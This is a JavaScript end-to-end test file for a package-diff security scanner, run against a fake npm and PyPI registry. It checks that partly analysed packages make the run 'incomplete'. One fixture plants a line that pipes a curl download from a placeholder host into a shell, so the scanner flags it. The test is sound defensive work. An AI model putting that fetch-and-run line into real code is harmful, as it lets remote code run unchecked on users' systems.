// End to end: a package whose files were not all fully analysed never makes a run "clean", and
// the REPORT names the files and reasons. Each test runs the real runInput → analysis → fetch →
// digest → archive path against a fake public registry serving synthetic archives.
import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { runInput } from '../src/main.js';
import { stubFetch, memoryIo, tgz, zip } from './helpers.js';

const NPM = 'https://registry.npmjs.org';
const FILES = 'https://files.pythonhosted.org/packages';

/** Fake registry. npm: { name: { version: files } }; pypi: { name: { version: { wheel?, sdist?, badSdist? } } } */
function fakeRegistry({ npm = {}, pypi = {} }) {
    const blobs = new Map();
    const blob = (url, buf) => { blobs.set(url, buf); return url; };
    const packuments = {};
    for (const [name, versions] of Object.entries(npm)) {
        const doc = { name, 'dist-tags': {}, versions: {}, time: { created: '2020-01-01T00:00:00.000Z' }, maintainers: [{ name: 'owner' }] };
        for (const [v, files] of Object.entries(versions)) {
            const buf = tgz(Object.entries({ 'package.json': JSON.stringify({ name, version: v }), ...files }).map(([n, data]) => ({ name: `package/${n}`, data })));
            const url = blob(`${NPM}/${name}/-/${name}-${v}.tgz`, buf);
            doc.versions[v] = { name, version: v, dist: { tarball: url, integrity: `sha512-${crypto.createHash('sha512').update(buf).digest('base64')}` } };
            doc.time[v] = '2020-01-02T00:00:00.000Z';
            doc['dist-tags'].latest = v;
        }
        packuments[name] = doc;
    }
    const projects = {};
    for (const [name, versions] of Object.entries(pypi)) {
        const releases = {};
        let i = 0;
        for (const [v, arts] of Object.entries(versions)) {
            const t = `2020-01-0${++i}T00:00:00Z`;
            releases[v] = [];
            const meta = `${name}-${v}.dist-info/METADATA`;
            if (arts.wheel) {
                const buf = zip([{ name: meta, data: `Metadata-Version: 2.1\nName: ${name}\nVersion: ${v}\n` }, ...arts.wheel]);
                const fn = `${name}-${v}-py3-none-any.whl`;
                releases[v].push({ filename: fn, packagetype: 'bdist_wheel', size: buf.length, upload_time_iso_8601: t, url: blob(`${FILES}/${fn}`, buf), digests: { sha256: crypto.createHash('sha256').update(buf).digest('hex') } });
            }
            if (arts.sdist) {
                const buf = tgz(Object.entries({ 'PKG-INFO': `Metadata-Version: 2.1\nName: ${name}\nVersion: ${v}\n`, ...arts.sdist }).map(([n, data]) => ({ name: `${name}-${v}/${n}`, data })));
                const fn = `${name}-${v}.tar.gz`;
                const sha = crypto.createHash('sha256').update(arts.badSdist ? Buffer.from('other') : buf).digest('hex');
                releases[v].push({ filename: fn, packagetype: 'sdist', size: buf.length, upload_time_iso_8601: t, url: blob(`${FILES}/${fn}`, buf), digests: { sha256: sha } });
            }
        }
        projects[name] = { info: { name, version: Object.keys(versions).pop(), author_email: 'owner@example.org' }, releases };
    }
    return stubFetch((url) => {
        if (blobs.has(url)) return new Response(blobs.get(url));
        const u = new URL(url);
        if (u.hostname === 'registry.npmjs.org') {
            const doc = packuments[decodeURIComponent(u.pathname.slice(1))];
            return doc ? new Response(JSON.stringify(doc)) : undefined;
        }
        if (u.hostname === 'pypi.org') {
            const doc = projects[decodeURIComponent(u.pathname.split('/')[2])];
            return doc ? new Response(JSON.stringify(doc)) : undefined;
        }
        return undefined;
    });
}

// Fixed corpus. Names are unique to this file because the registry client caches per name.
const js = (body) => `module.exports = function () { ${body} };\n`;
const py = (body) => `def f():\n    ${body}\n`;
const NPM_PKGS = {
    'cov-full': { '1.0.0': { 'index.js': js('return 1;') }, '1.0.1': { 'index.js': js('return 2;') } },
    'cov-ts': { '1.0.0': { 'index.js': js('return 1;'), 'src/view.tsx': 'export const a = <b>{1}</b>;\n' }, '1.0.1': { 'index.js': js('return 2;'), 'src/view.tsx': 'export const a = <b>{2}</b>;\n' } },
    'cov-broken': { '1.0.0': { 'index.js': js('return 1;') }, '1.0.1': { 'index.js': js('return 2;'), 'lib/odd.js': 'function ( {\n' } },
    'cov-ts-loud': {
        '1.0.0': { 'index.js': js('return 1;'), 'src/view.tsx': 'export const a = <b>{1}</b>;\n' },
        '1.0.1': { 'index.js': js("require('child_process').exec('curl https://x.example | sh');"), 'src/view.tsx': 'export const a = <b>{2}</b>;\n' },
    },
};
const PYPI_PKGS = {
    'covpyfull': { '1.0.0': { wheel: [{ name: 'covpyfull/__init__.py', data: py('return 1') }] }, '1.0.1': { wheel: [{ name: 'covpyfull/__init__.py', data: py('return 2') }] } },
    'covpyenc': {
        '1.0.0': { wheel: [{ name: 'covpyenc/__init__.py', data: py('return 1') }] },
        '1.0.1': { wheel: [{ name: 'covpyenc/__init__.py', data: py('return 2') }, { name: 'covpyenc/_hidden.py', data: py('return 3'), flags: 1 }] },
    },
    'covpyart': {
        '1.0.0': { wheel: [{ name: 'covpyart/__init__.py', data: py('return 1') }], sdist: { 'covpyart/__init__.py': py('return 1') } },
        '1.0.1': { wheel: [{ name: 'covpyart/__init__.py', data: py('return 2') }], sdist: { 'covpyart/__init__.py': py('return 2') }, badSdist: true },
    },
};

async function run(input) {
    const f = fakeRegistry({ npm: NPM_PKGS, pypi: PYPI_PKGS });
    try {
        const io = memoryIo();
        await runInput({ concurrency: 1, ...input }, io);
        assert.equal(io.failed, null, io.failed);
        const others = f.calls.filter((c) => !/^https:\/\/(registry\.npmjs\.org|pypi\.org|files\.pythonhosted\.org)\//.test(c.url));
        assert.deepEqual(others, []);
        return io;
    } finally { f.restore(); }
}

const item = (io, name) => io.items.find((i) => i.name === name);

test('package mode: fully parsed npm and PyPI controls are clean and complete', async () => {
    const io = await run({ packages: ['npm:cov-full@1.0.0..1.0.1', 'pypi:covpyfull==1.0.0..1.0.1'] });
    for (const n of ['cov-full', 'covpyfull']) {
        assert.equal(item(io, n).verdict, 'clean', n);
        assert.equal(item(io, n).coverage.complete, true, n);
    }
    assert.equal(io.kv.OUTPUT.verdict, 'clean');
    assert.equal(io.kv.OUTPUT.complete, true);
    assert.equal(io.kv.OUTPUT.coverage.packagesWithUnparsedFiles, 0);
    assert.match(io.kv.REPORT, /Overall: 🟢 Nothing new found in any change/);
    assert.equal(io.charges.length, 2);
});

for (const [label, spec, name, file, reason] of [
    ['pattern-only TypeScript', 'npm:cov-ts@1.0.0..1.0.1', 'cov-ts', 'src/view.tsx', /TypeScript source; pattern scan only/],
    ['unparseable JavaScript', 'npm:cov-broken@1.0.0..1.0.1', 'cov-broken', 'lib/odd.js', /not parsed/],
    ['unread encrypted file', 'pypi:covpyenc==1.0.0..1.0.1', 'covpyenc', 'covpyenc/_hidden.py', /encrypted/],
    ['failed artifact', 'pypi:covpyart==1.0.0..1.0.1', 'covpyart', 'sdist', /sha256 mismatch/],
]) {
    test(`package mode: ${label} → package and run "incomplete", REPORT names the gap`, async () => {
        const io = await run({ packages: [spec, 'npm:cov-full@1.0.0..1.0.1'] });
        const it = item(io, name);
        assert.equal(it.verdict, 'incomplete');
        assert.equal(it.coverage.complete, false);
        assert.equal(item(io, 'cov-full').verdict, 'clean');
        assert.equal(io.kv.OUTPUT.verdict, 'incomplete');
        assert.equal(io.kv.OUTPUT.complete, false);
        assert.equal(io.kv.OUTPUT.coverage.packagesWithUnparsedFiles, 1);
        assert.deepEqual(io.kv.OUTPUT.counts, { review: 0, notice: 0, clean: 1, incomplete: 1, error: 0 });
        const md = io.kv.REPORT;
        assert.doesNotMatch(md, /Nothing new found in any change/);
        assert.match(md, /Overall: ⚪ Incomplete/);
        assert.match(md, /1 analysed package\(s\) only partly analysed/);
        assert.match(md, new RegExp(`⚪ PARTLY ANALYSED — \`${name}\` `));
        assert.ok(md.includes(file), `REPORT names ${file}`);
        assert.match(md, reason);
        assert.match(md, /in the files that were inspected/);
        assert.equal(io.charges.length, 2); // a partly analysed package was still analysed
    });
}

test('package mode: a review finding still wins over a coverage gap', async () => {
    const io = await run({ packages: ['npm:cov-ts-loud@1.0.0..1.0.1'] });
    assert.equal(item(io, 'cov-ts-loud').verdict, 'review');
    assert.equal(io.kv.OUTPUT.verdict, 'review');
    assert.equal(io.kv.OUTPUT.complete, false);
    assert.match(io.kv.REPORT, /src\/view\.tsx/);
});

const npmLock = (pkgs) => JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'app' }, ...Object.fromEntries(Object.entries(pkgs).map(([n, v]) => [`node_modules/${n}`, { version: v, resolved: `${NPM}/${n}/-/${n}-${v}.tgz` }])) } });
const uvLock = (pkgs) => `version = 1\nrequires-python = ">=3.9"\n\n${Object.entries(pkgs).map(([n, v]) => `[[package]]\nname = "${n}"\nversion = "${v}"\nsource = { registry = "https://pypi.org/simple" }\n`).join('\n')}`;

test('lockfile mode (npm): fully parsed control is clean; partial packages are incomplete with file detail in REPORT', async () => {
    let io = await run({ lockfileBefore: npmLock({ 'cov-full': '1.0.0' }), lockfileAfter: npmLock({ 'cov-full': '1.0.1' }) });
    assert.equal(io.kv.OUTPUT.verdict, 'clean');
    assert.equal(io.kv.OUTPUT.complete, true);
    assert.match(io.kv.REPORT, /<summary>Nothing new found in 1 package\(s\)<\/summary>/);

    io = await run({ lockfileBefore: npmLock({ 'cov-full': '1.0.0', 'cov-ts': '1.0.0', 'cov-broken': '1.0.0' }), lockfileAfter: npmLock({ 'cov-full': '1.0.1', 'cov-ts': '1.0.1', 'cov-broken': '1.0.1' }) });
    assert.equal(io.kv.OUTPUT.verdict, 'incomplete');
    assert.equal(io.kv.OUTPUT.complete, false);
    assert.equal(io.kv.OUTPUT.coverage.packagesWithUnparsedFiles, 2);
    assert.deepEqual(io.charges, [{ eventName: 'lockfile-report', count: 1 }]);
    const md = io.kv.REPORT;
    assert.match(md, /Overall: ⚪ Incomplete/);
    assert.match(md, /2 analysed package\(s\) only partly analysed/);
    assert.doesNotMatch(md, /see each package/);
    // Only the fully read package goes into the compact list; the others keep their details.
    const compact = md.slice(md.indexOf('<summary>Nothing new found in'), md.indexOf('</details>', md.indexOf('<summary>Nothing new found in')));
    assert.match(compact, /Nothing new found in 1 package\(s\)/);
    assert.match(compact, /cov-full/);
    assert.doesNotMatch(compact, /cov-ts|cov-broken/);
    assert.match(md, /⚪ PARTLY ANALYSED — `cov-ts` `1\.0\.0` → `1\.0\.1`/);
    assert.match(md, /src\/view\.tsx: TypeScript source; pattern scan only/);
    assert.match(md, /⚪ PARTLY ANALYSED — `cov-broken` `1\.0\.0` → `1\.0\.1`/);
    assert.match(md, /lib\/odd\.js: not parsed/);
});

test('lockfile mode (uv): unread file and failed artifact are incomplete with detail; control is clean', async () => {
    let io = await run({ lockfileBefore: uvLock({ covpyfull: '1.0.0' }), lockfileAfter: uvLock({ covpyfull: '1.0.1' }) });
    assert.equal(io.kv.OUTPUT.verdict, 'clean');
    assert.equal(io.kv.OUTPUT.complete, true);

    io = await run({ lockfileBefore: uvLock({ covpyfull: '1.0.0', covpyenc: '1.0.0', covpyart: '1.0.0' }), lockfileAfter: uvLock({ covpyfull: '1.0.1', covpyenc: '1.0.1', covpyart: '1.0.1' }) });
    assert.equal(io.kv.OUTPUT.verdict, 'incomplete');
    assert.equal(io.kv.OUTPUT.complete, false);
    assert.equal(io.kv.OUTPUT.coverage.packagesWithUnparsedFiles, 2);
    assert.equal(item(io, 'covpyenc').verdict, 'incomplete');
    assert.equal(item(io, 'covpyart').verdict, 'incomplete');
    assert.equal(item(io, 'covpyfull').verdict, 'clean');
    const md = io.kv.REPORT;
    assert.match(md, /covpyenc\/_hidden\.py: encrypted/);
    assert.match(md, /not compared: .*sdist: .*sha256 mismatch/);
    assert.doesNotMatch(md, /Nothing new found in any change/);
});
